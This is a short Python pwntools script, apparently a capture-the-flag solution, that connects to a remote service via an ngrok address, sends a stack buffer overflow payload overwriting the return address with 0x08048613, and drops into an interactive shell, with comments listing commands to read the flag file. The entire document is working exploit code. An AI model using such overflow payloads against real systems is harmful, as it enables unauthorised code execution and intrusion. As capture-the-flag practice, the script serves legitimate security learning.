#!/usr/bin/env python

from pwn import *

port = 15027

context.log_level = 'debug'
#p = process('./magic')
p = remote('0.tcp.ngrok.io', port)
p.sendline('bread')
p.sendline('a'*19+'\0'+'a'*52+p32(0x08048613))
p.interactive()

#ls
#cd /home/ctf
#cat flag